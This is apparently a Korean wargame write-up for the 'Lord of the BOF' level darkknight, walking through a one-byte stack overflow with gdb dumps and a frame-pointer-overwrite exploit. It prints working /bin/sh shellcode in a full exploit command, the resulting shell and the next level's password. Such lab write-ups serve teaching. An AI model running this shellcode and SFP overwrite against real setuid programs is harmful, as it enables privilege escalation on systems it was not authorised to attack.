# darknight

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/

#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
        char buffer[40];
        strncpy(buffer, src, 41);
        printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
        if(argc<2){
                printf("argv error\n");
                exit(0);
        }

        problem_child(argv[1]);
}
```

처음보는 유형이다. 힌트로  FPO라는 것을 주고 있는데 일단 찾아보지 않고 풀어봤다.

지금까지는 main함수 하나에서 ret를 덥어 쓰거나 변수를 이용했는데 처음으로 다른 함수가 생겼다. 이 말은 stack구조에서 ret위에 다른 주소가 들어가게 된다는 것을 의미한다. 게다가 인자를 덥어 쓸 수 있는 값이 41bytes여서 sfp를 지나 ret을 덥어 쓸 수도  없다.

일단 잘 모르겠으니 아무거나 주고 stack을 보도록 하자.

```assembly
(gdb) x/100x $esp-2
0xbffffa69:     0x444000ae      0xe0bffffb      0xf0400143      0xc040021d
0xbffffa79:     0x2c401088      0xf0400298      0xb440021d      0x70bffffa
0xbffffa89:     0x764000a9      0xecbffffc      0x20bffffa      0xe04005d9
0xbffffa99:     0xb4400143      0x70bffffa      0x80400660      0x00401069
0xbffffaa9:     0xc4080485      0xecbffffa      0xec401081      0x66bffffa
0xbffffab9:     0x00080484      0xc4080485      0x63bffffa      0x63636363
0xbffffac9:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffad9:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffae9:     0x63636363      0x9ebffffa      0x4d080484      0x18bffffc
0xbffffaf9:     0xcbbffffb      0x02400309      0x44000000      0x50bffffb
0xbffffb09:     0x68bffffb      0x02400138      0x90000000      0x00080483
0xbffffb19:     0xb1000000      0x6c080483      0x02080484      0x44000000
0xbffffb29:     0xe4bffffb      0xdc080482      0x60080484      0x3c4000ae
0xbffffb39:     0x90bffffb      0x0240013e      0x40000000      0x4dbffffc
0xbffffb49:     0x00bffffc      0x77000000      0x87bffffc      0x9fbffffc
0xbffffb59:     0xbebffffc      0xe0bffffc      0xebbffffc      0xaebffffc
0xbffffb69:     0xcdbffffe      0xe8bffffe      0xfdbffffe      0x1abffffe
0xbffffb79:     0x25bfffff      0x33bfffff      0x3bbfffff      0x4cbfffff
0xbffffb89:     0x56bfffff      0x64bfffff      0x75bfffff      0x83bfffff
0xbffffb99:     0x8ebfffff      0x9fbfffff      0xe0bfffff      0x00bfffff
0xbffffba9:     0x03000000      0x34000000      0x04080480      0x20000000
0xbffffbb9:     0x05000000      0x06000000      0x06000000      0x00000000
0xbffffbc9:     0x07000010      0x00000000      0x08400000      0x00000000
0xbffffbd9:     0x09000000      0x90000000      0x0b080483      0xff000000
0xbffffbe9:     0x0c000001      0xff000000      0x0d000001      0xff000000
(gdb)
0xbffffbf9:     0x0e000001      0xff000000      0x10000001      0xff000000
0xbffffc09:     0x0f0fabfb      0x3b000000      0x00bffffc      0x00000000
0xbffffc19:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc29:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc39:     0x36690000      0x2e003638      0x6161612f      0x61616161
0xbffffc49:     0x00616161      0x63636363      0x63636363      0x63636363
0xbffffc59:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffc69:     0x63636363      0x63636363      0x63636363      0x57500063
0xbffffc79:     0x682f3d44      0x2f656d6f      0x656c6f67      0x4552006d
0xbffffc89:     0x45544f4d      0x54534f48      0x3239313d      0x3836312e
0xbffffc99:     0x2e34372e      0x4f480031      0x414e5453      0x6c3d454d
0xbffffca9:     0x6c61636f      0x74736f68      0x636f6c2e      0x6f646c61
0xbffffcb9:     0x6e69616d      0x53454c00      0x45504f53      0x2f7c3d4e
0xbffffcc9:     0x2f727375      0x2f6e6962      0x7373656c      0x65706970
0xbffffcd9:     0x2068732e      0x55007325      0x3d524553      0x656c6f67
0xbffffce9:     0x534c006d      0x4c4f435f      0x3d53524f      0x303d6f6e
0xbffffcf9:     0x69663a30      0x3a30303d      0x303d6964      0x34333b31
0xbffffd09:     0x3d6e6c3a      0x333b3130      0x69703a36      0x3b30343d
0xbffffd19:     0x733a3333      0x31303d6f      0x3a35333b      0x343d6462
0xbffffd29:     0x33333b30      0x3a31303b      0x343d6463      0x33333b30
0xbffffd39:     0x3a31303b      0x303d726f      0x35303b31      0x3b37333b
0xbffffd49:     0x6d3a3134      0x31303d69      0x3b35303b      0x343b3733
0xbffffd59:     0x78653a31      0x3b31303d      0x2a3a3233      0x646d632e
0xbffffd69:     0x3b31303d      0x2a3a3233      0x6578652e      0x3b31303d
0xbffffd79:     0x2a3a3233      0x6d6f632e      0x3b31303d      0x2a3a3233
```

c(\x63)이 들어간 부분이 두 부분 보인다. 하나는 argv[1]일 것이고 나머지 하나는 buffer일 것이다.

argv[1]은 41bytes가 넘어가도 덥어 쓸 것이므로 좀 더 많이 주고 확인해봤다.

```assembly
[golem@localhost golem]$ ./aaaaaaaaaa `python -c 'print "c"*90'`
ccccccccccccccccccccccccccccccccccccccccc▒▒▒▒▒▒▒▒▒▒▒▒   @
Segmentation fault (core dumped)
[golem@localhost golem]$ gdb -c core -q
Core was generated by `./aaaaaaaaaa cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc'.
Program terminated with signal 11, Segmentation fault.
#0  0x143e040 in ?? ()
(gdb) x/100x $esp+1
0xbffffa6c:     0xbffffa84      0x40066070      0x40106980      0x08048500
0xbffffa7c:     0xbffffa94      0x401081ec      0xbffffabc      0x08048466
0xbffffa8c:     0x08048500      0xbffffa94      0x63636363      0x63636363
0xbffffa9c:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffaac:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffabc:     0xbffffa63      0x0804849e      0xbffffc1c      0xbffffae8
0xbffffacc:     0x400309cb      0x00000002      0xbffffb14      0xbffffb20
0xbffffadc:     0x40013868      0x00000002      0x08048390      0x00000000
0xbffffaec:     0x080483b1      0x0804846c      0x00000002      0xbffffb14
0xbffffafc:     0x080482e4      0x080484dc      0x4000ae60      0xbffffb0c
0xbffffb0c:     0x40013e90      0x00000002      0xbffffc0f      0xbffffc1c
0xbffffb1c:     0x00000000      0xbffffc77      0xbffffc87      0xbffffc9f
0xbffffb2c:     0xbffffcbe      0xbffffce0      0xbffffceb      0xbffffeae
0xbffffb3c:     0xbffffecd      0xbffffee8      0xbffffefd      0xbfffff1a
0xbffffb4c:     0xbfffff25      0xbfffff33      0xbfffff3b      0xbfffff4c
0xbffffb5c:     0xbfffff56      0xbfffff64      0xbfffff75      0xbfffff83
0xbffffb6c:     0xbfffff8e      0xbfffff9f      0xbfffffe0      0x00000000
0xbffffb7c:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffffb8c:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffffb9c:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffffbac:     0x00000009      0x08048390      0x0000000b      0x000001ff
0xbffffbbc:     0x0000000c      0x000001ff      0x0000000d      0x000001ff
0xbffffbcc:     0x0000000e      0x000001ff      0x00000010      0x0fabfbff
0xbffffbdc:     0x0000000f      0xbffffc0a      0x00000000      0x00000000
0xbffffbec:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb)
0xbffffbfc:     0x00000000      0x00000000      0x00000000      0x36690000
0xbffffc0c:     0x2e003638      0x6161612f      0x61616161      0x00616161
0xbffffc1c:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffc2c:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffc3c:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffc4c:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffc5c:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffc6c:     0x63636363      0x63636363      0x50006363      0x2f3d4457
0xbffffc7c:     0x656d6f68      0x6c6f672f      0x52006d65      0x544f4d45
0xbffffc8c:     0x534f4845      0x39313d54      0x36312e32      0x34372e38
0xbffffc9c:     0x4800312e      0x4e54534f      0x3d454d41      0x61636f6c
0xbffffcac:     0x736f686c      0x6f6c2e74      0x646c6163      0x69616d6f
0xbffffcbc:     0x454c006e      0x504f5353      0x7c3d4e45      0x7273752f
0xbffffccc:     0x6e69622f      0x73656c2f      0x70697073      0x68732e65
0xbffffcdc:     0x00732520      0x52455355      0x6c6f673d      0x4c006d65
0xbffffcec:     0x4f435f53      0x53524f4c      0x3d6f6e3d      0x663a3030
0xbffffcfc:     0x30303d69      0x3d69643a      0x333b3130      0x6e6c3a34
0xbffffd0c:     0x3b31303d      0x703a3633      0x30343d69      0x3a33333b
0xbffffd1c:     0x303d6f73      0x35333b31      0x3d64623a      0x333b3034
0xbffffd2c:     0x31303b33      0x3d64633a      0x333b3034      0x31303b33
0xbffffd3c:     0x3d726f3a      0x303b3130      0x37333b35      0x3a31343b
0xbffffd4c:     0x303d696d      0x35303b31      0x3b37333b      0x653a3134
0xbffffd5c:     0x31303d78      0x3a32333b      0x6d632e2a      0x31303d64
0xbffffd6c:     0x3a32333b      0x78652e2a      0x31303d65      0x3a32333b
0xbffffd7c:     0x6f632e2a      0x31303d6d      0x3a32333b      0x74622e2a
```

예상대로 한 쪽은 90bytes가 그대로 있지만 한 쪽은 40bytes 정도만 남은 것을 알 수 있다. 

그래서 buffer는 0xbffffa94부터 시작임을 알 수 있다. 그럼 그 뒷 부분이 sfp일텐데 1byte를 더 쓸 수 있으므로 스택안으로 다시 돌아갈 수 있겠다. (이 부분에서 FPO를 찾아보았다)

역시 sfp는 0xbffffa으로 채워져있고 마지막 한 byte만 덥어 씌워서 child함수가 종료될 때 다른 곳으로 돌아가도록 할 수 있겠다. 여기서부터 여러가지로 풀 수 있다고 하는데 나는 직관적으로 buffer에 쉘코드를 넣고 buffer로 다시 돌아가도록 했다. 

먼저 테스트를 위해 복사한 실행파일에 적용해보자



(중간에 데이터 다 날려서 다시 만들어야 한다)



sfp를 조작하는 이유는 main의 EBP를 가지고 있는데 이 부분을 조작하면 child가 종료될 때 main이 아니라 조작된 곳으로 가게 되고 main함수까지 끝나가면 ret 명령어에 의해서 ebp+4부분으로 돌아가 jump한다. 따라서 buffer의 시작 주소가 들어가 있는 위치 - 4인 부분으로 sfp를 조작해주면 공격이 가능하다.

```bash
[golem@localhost golem]$ ./aaaaaaaaa `python -c 'print "\x90"*9+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\xbc"'`
▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                             ̀1▒̀▒▒▒▒▒O▒▒▒▒▒▒▒    @
bash$ whoami
golem
bash$ my-pass
euid = 511
cup of coffee
bash$ exit
exit
```

```bash
[golem@localhost golem]$ ./darkknight `python -c 'print "\x90"*9+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\xbc"'`
▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                             ̀1▒̀▒▒▒▒▒M▒▒▒▒▒▒▒    @
bash$ whoami
darkknight
bash$ my-pass
euid = 512
new attacker
bash$ exit
exit
```

